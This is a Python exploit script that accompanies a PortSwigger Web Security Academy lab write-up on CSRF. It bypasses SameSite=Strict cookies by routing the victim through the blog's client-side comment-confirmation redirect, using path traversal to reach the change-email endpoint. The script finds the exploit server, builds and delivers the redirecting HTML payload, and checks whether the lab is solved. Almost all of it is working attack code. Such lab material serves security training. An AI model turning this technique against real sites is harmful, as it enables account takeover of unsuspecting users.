#!/usr/bin/env python3
"""
SameSite Strict bypass via client-side redirect
PortSwigger Web Security Academy -- Cross-Site Request Forgery (CSRF)

Companion script for the writeup: 08-samesite-strict-client-side-redirect.md

What this does:
    Session cookies here are SameSite=Strict, so a direct cross-site request
    to /my-account/change-email never carries the cookie. The blog's comment
    feature redirects client-side after posting via
    /resources/js/commentConfirmationRedirect.js, which builds
    document.location from the postId query parameter with no sanitization --
    a path-traversal gadget. craft_samesite_strict_redirect() in CSRF.py
    builds a page that sends the victim to
    /post/comment/confirmation?postId=../my-account/change-email?email=...&submit=1;
    the first hop to the confirmation page is genuinely cross-site (Strict
    withholds the cookie, but nothing sensitive happens there), while the
    second hop -- the confirmation page's own script redirecting via
    document.location -- is a same-site navigation the browser's SameSite
    logic never flags, so the Strict cookie rides along.

Usage:
    python 08-samesite-strict-client-side-redirect.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import time
import urllib.parse
import httpx


def _get_exploit_server_url(client: httpx.Client) -> str:
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else ""


def _exploit_server_deliver(exploit_url: str, body: str, headers: str) -> bool:
    with httpx.Client(follow_redirects=True, timeout=20) as c:
        r = c.post(exploit_url, data={
            "responseFile": "/exploit",
            "responseBody": body,
            "responseHead": headers,
            "formAction": "DELIVER_TO_VICTIM",
        })
    return r.status_code < 400


def solve(lab_url: str) -> None:
    client = httpx.Client(
        base_url=lab_url, follow_redirects=True, timeout=20,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
    )
    client.get("/")

    exploit_url = _get_exploit_server_url(client)
    if not exploit_url:
        print("[-] No exploit server found.")
        return

    redirect_gadget = "/post/comment/confirmation?postId="
    target_path = "../my-account/change-email"
    target_params = {"email": "hacker@evil-user.net", "submit": "1"}

    qs = urllib.parse.urlencode(target_params)
    payload_path = urllib.parse.quote(f"{target_path}?{qs}")
    gadget_url = f"{lab_url}{redirect_gadget}{payload_path}"

    html = f'<html><body>\n<script>document.location = "{gadget_url}";</script>\n</body></html>'
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    print("[*] Technique: SameSite Strict bypass: client-side redirect chain")
    print(f"[*] Gadget URL: {gadget_url}")

    _exploit_server_deliver(exploit_url, html, headers)
    time.sleep(8)

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved -- the client-side redirect smuggled a same-site request through.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
